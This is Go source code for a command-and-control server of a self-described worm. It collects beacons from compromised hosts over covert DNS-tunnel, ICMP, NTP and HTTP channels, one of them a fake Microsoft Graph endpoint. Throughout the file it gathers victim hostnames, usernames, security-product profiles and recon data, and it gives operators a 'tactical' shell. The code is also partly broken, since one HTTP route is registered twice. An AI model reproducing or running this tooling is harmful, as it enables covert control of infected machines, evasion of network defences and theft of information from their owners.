package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"github.com/gin-gonic/gin"
	"github.com/miekg/dns"
	"github.com/pterm/pterm"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// The root domain we are authoritative for
const rootDomain = "c2.hydra-worm.local."

// Telemetry represents the data structure expected from the Rust Agent
// Enhanced to support Sprint 2: Recon Pillars I - VII
type Telemetry struct {
	AgentID         string  `json:"a"`
	Transport       string  `json:"t"`
	Status          string  `json:"s"`
	Lambda          float64 `json:"l"`
	Hostname        string  `json:"h"`
	Username        string  `json:"u"`
	OS              string  `json:"o"`
	EnvContext      string  `json:"e"`
	ArtifactPreview string  `json:"p"`
	DefenseProfile  string  `json:"d"`
}

// RenderVaporBanner displays the header-based banner with the tactical aesthetic
func RenderVaporBanner() {
	fmt.Print("\033[H\033[2J") 

	pterm.NewStyle(pterm.FgCyan, pterm.Bold).Println(`
           / /_  __  ______  __/ /__________ _   
          / __ \/ / / / __ \/ __  / ___/ __ ` + "`" + `   
         / / / / /_/ / /_/ / /_/ / /  / /_/ /    
        /_/ /_/\__, / .___/\__,_/_/   \__,_/     
   _      ____/____/_/___  ____ ___              
  | | /| / / __ \/ __ \/ __ ` + "`" + `__ \                
  | |/ |/ / /_/ / /_/ / / / / / /                
  |__/|__/\____/_/ .__/_/ /_/ /_/                 
                /_/                              
    W O R M  -  O R C H E S T R A T O R`)

	pterm.Println(pterm.Cyan("────────────────────────────────────────────────────────────"))

	pterm.DefaultTable.WithData(pterm.TableData{
		{"LISTENER", "PORT", "STATUS", "STRENGTH"},
		{"Cloud API", "443", pterm.LightGreen("ACTIVE"), "ELITE"},
		{"Malleable HTTP", "8080", pterm.LightGreen("LISTENING"), "HIGH"},
		{"P2P Gossip", "9090", pterm.LightYellow("STANDBY"), "MESH"},
		{"DNS Tunnel", "53", pterm.LightGreen("LISTENING"), "CRITICAL"},
		{"ICMP Echo", "RAW", pterm.LightGreen("ACTIVE"), "FAILSAFE"},
		{"NTP Covert", "123", pterm.LightGreen("ACTIVE"), "STEALTH"},
	}).WithBoxed().Render()

	pterm.Printf("\n%s Phase 2.4: Full-Spectrum C2 Verified & Operational.\n\n", pterm.Cyan("»"))
}

// LogHeartbeat provides consistent, colored feedback like VaporTrace
func LogHeartbeat(transport string, t Telemetry) {
	timestamp := time.Now().Format("15:04:05")
	
	pterm.Printf("[%s] %s | ID: %s | %s@%s\n",
		pterm.Gray(timestamp),
		pterm.LightCyan(transport),
		pterm.LightWhite(t.AgentID),
		pterm.LightMagenta(t.Username),
		t.Hostname)

	pterm.Printf("      ├─ %s %s\n", pterm.LightRed("EDR/AV:"), pterm.Yellow(t.DefenseProfile))
	
	if t.ArtifactPreview != "" && t.ArtifactPreview != "Access Denied" {
		pterm.Printf("      └─ %s %s\n", 
			pterm.LightYellow("RECON:"), 
			pterm.Italic.Sprint(t.ArtifactPreview))
	}
}

// parseHydraDNS handles incoming DNS Tunneling heartbeats
func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, q := range r.Question {
		rawName := strings.TrimSuffix(q.Name, ".")
		cleanRoot := strings.TrimSuffix(rootDomain, ".")

		if strings.HasSuffix(strings.ToLower(rawName), strings.ToLower(cleanRoot)) {
			// Extract and Reassemble Base64 payload from labels
			payloadPart := rawName[:len(rawName)-len(cleanRoot)-1]
			encodedPayload := strings.ReplaceAll(payloadPart, ".", "") 
			
			// Handle URL-Safe Base64 padding
			normalized := strings.ReplaceAll(encodedPayload, "-", "+")
			normalized = strings.ReplaceAll(normalized, "_", "/")
			for len(normalized)%4 != 0 { normalized += "=" }

			decoded, err := base64.RawURLEncoding.DecodeString(encodedPayload)
			if err != nil {
				decoded, _ = base64.StdEncoding.DecodeString(normalized)
			}

			if decoded != nil {
				var t Telemetry
				if err := json.Unmarshal(decoded, &t); err == nil {
					LogHeartbeat("DNS", t)
					rr, _ := dns.NewRR(fmt.Sprintf("%s 60 IN A 127.0.0.1", q.Name))
					msg.Answer = append(msg.Answer, rr)
				}
			}
		}
	}
	w.WriteMsg(msg)
}

func startDNSServer() {
	dns.HandleFunc(rootDomain, parseHydraDNS)
	server := &dns.Server{Addr: ":53", Net: "udp"}
	if err := server.ListenAndServe(); err != nil {
		log.Printf("[-] DNS Server Failed: %v", err)
	}
}

// StartIcmpListener monitors for ICMP Echo Requests with telemetry payloads
func StartIcmpListener() {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil { return }
	defer conn.Close()

	for {
		rb := make([]byte, 1500)
		n, peer, _ := conn.ReadFrom(rb)
		
		// Maintain your ingress feedback
		fmt.Printf("\n[!] ICMP INGRESS: %d bytes from %s\n", n, peer)

		msg, _ := icmp.ParseMessage(1, rb[:n])
		if msg.Type == ipv4.ICMPTypeEcho {
			// Process Telemetry Payload
			body, _ := msg.Body.Marshal(1)
			if len(body) > 4 {
				processRawPayload(body[4:], peer.String(), "ICMP")
			}

			// Construct Authenticated Reply
			echoBody := msg.Body.(*icmp.Echo)
			reply := icmp.Message{
				Type: ipv4.ICMPTypeEchoReply, Code: 0,
				Body: &icmp.Echo{
					ID:   echoBody.ID,
					Seq:  echoBody.Seq,
					Data: []byte("HYDRA_ACK"), // The mutation key
				},
			}
			mb, _ := reply.Marshal(nil)
			conn.WriteTo(mb, peer)
			
			// Maintain your egress feedback
			fmt.Println("[+] Sent HYDRA_ACK")
		}
	}
}

// StartNtpListener monitors UDP/123 for covert timestamps
func StartNtpListener() {
	addr, _ := net.ResolveUDPAddr("udp", ":123")
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		pterm.Error.Printf("Failed to bind NTP: %v\n", err)
		return
	}
	defer conn.Close()
	
	for {
		buf := make([]byte, 1500)
		n, addr, _ := conn.ReadFromUDP(buf)
		if n >= 48 {
			// Extract telemetry from trailing bytes or timestamp fields
			processRawPayload(buf[40:n], addr.String(), "NTP")
		}
	}
}

// processRawPayload decodes non-HTTP/DNS data streams
func processRawPayload(data []byte, peer string, tier string) {
	rawStr := strings.ReplaceAll(string(data), ".", "")
	decoded, err := base64.RawURLEncoding.DecodeString(rawStr)
	if err != nil { return }

	var t Telemetry
	if err := json.Unmarshal(decoded, &t); err == nil {
		LogHeartbeat(tier, t)
	}
}

func main() {
	// 1. Initialize Tactical UI and Engine
	RenderVaporBanner()
	gin.SetMode(gin.ReleaseMode)
	
	r := gin.New() 
	r.Use(gin.Recovery())

	// 2. Tier 1: Microsoft Graph (Cloud) Webhook Mock
	r.POST("/v1.0/me/drive/root/children", func(c *gin.Context) {
		var telemetry Telemetry
		if err := c.ShouldBindJSON(&telemetry); err == nil {
			LogHeartbeat("CLOUD", telemetry)
			c.JSON(201, gin.H{
				"@odata.context": "https://graph.microsoft.com/v1.0/$metadata#items",
				"id":              "01ABC-HYDRA-V1",
			})
		}
	})
	
// --- TIER 1: Microsoft Graph (Cloud) Mock ---
    // This simulates the Agent talking to a legitimate Microsoft API
    r.POST("/v1.0/me/drive/root/children", func(c *gin.Context) {
        var telemetry Telemetry
        if err := c.ShouldBindJSON(&telemetry); err == nil {
            LogHeartbeat("CLOUD (Tier 1)", telemetry)
            c.JSON(http.StatusCreated, gin.H{
                "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#items",
                "id":              "01ABC-HYDRA-V1",
            })
        }
    })

    r.GET("/v1.0/me/messages", func(c *gin.Context) {
        c.JSON(http.StatusOK, gin.H{
            "value": []interface{}{
                gin.H{
                    "subject": "Mission Update",
                    "body": gin.H{
                        "content": "{\"status\":\"ok\",\"task\":\"SLEEP\",\"epoch\":1705920000}",
                    },
                },
            },
        })
    })

    // --- TIER 2: Malleable HTTP Heartbeat ---
    // This matches the Agent's: http://localhost:8080/api/v1/heartbeat
    r.POST("/api/v1/heartbeat", func(c *gin.Context) {
        var telemetry Telemetry
        if err := c.ShouldBindJSON(&telemetry); err == nil {
            LogHeartbeat("MALLEABLE-HTTP (Tier 2)", telemetry)
            c.JSON(http.StatusOK, gin.H{
                "status": "ok",
                "task":   "NOP",
                "epoch":  time.Now().Unix(),
            })
        }
    })

	// 4. Start Full-Spectrum Background Listeners
	go StartIcmpListener() 
	go StartNtpListener()  
	go startDNSServer()    

	// 5. Start the HTTP/Cloud C2 Service (Tiers 1 & 2)
	go func() {
		if err := r.Run(":8080"); err != nil {
			log.Fatalf("[-] C2 Server Failed: %v", err)
		}
	}()

	// 6. Interactive Tactical Shell with Auto-Completion
	completer := readline.NewPrefixCompleter(
		readline.PcItem("agents"),
		readline.PcItem("tasks"),
		readline.PcItem("clear"),
		readline.PcItem("help"),
		readline.PcItem("exit"),
	)

	rl, err := readline.NewEx(&readline.Config{
		Prompt:          pterm.LightCyan("hydra-c2 > "),
		HistoryFile:      "/tmp/hydra.tmp",
		AutoComplete:     completer,
		InterruptPrompt: "^C",
		EOFPrompt:        "exit",
	})
	if err != nil {
		log.Fatalf("[-] Failed to initialize shell: %v", err)
	}
	defer rl.Close()

	// 7. Command Processing Loop
	for {
		line, err := rl.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 { break } else { continue }
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		if line == "" { continue }

		switch line {
		case "agents":
			pterm.DefaultSection.Println("Active Hydra Agents")
		case "clear", "cls":
			RenderVaporBanner()
		case "help":
			pterm.Info.Println("Available Commands:")
			pterm.BulletListPrinter{Items: []pterm.BulletListItem{
				{Level: 0, Text: "agents : List all beaconing entities"},
				{Level: 0, Text: "tasks  : View queued mission objectives"},
				{Level: 0, Text: "clear  : Refresh tactical display"},
				{Level: 0, Text: "exit   : Terminate orchestrator session"},
			}}.Render()
		case "exit":
			result, _ := pterm.DefaultInteractiveConfirm.
				WithDefaultText("Terminate mission and exit orchestrator?").
				WithConfirmStyle(pterm.NewStyle(pterm.FgRed, pterm.Bold)).
				Show()
			if result {
				os.Exit(0)
			}
		default:
			pterm.Error.Printfln("Unknown tactical command: %s", line)
		}
	}
}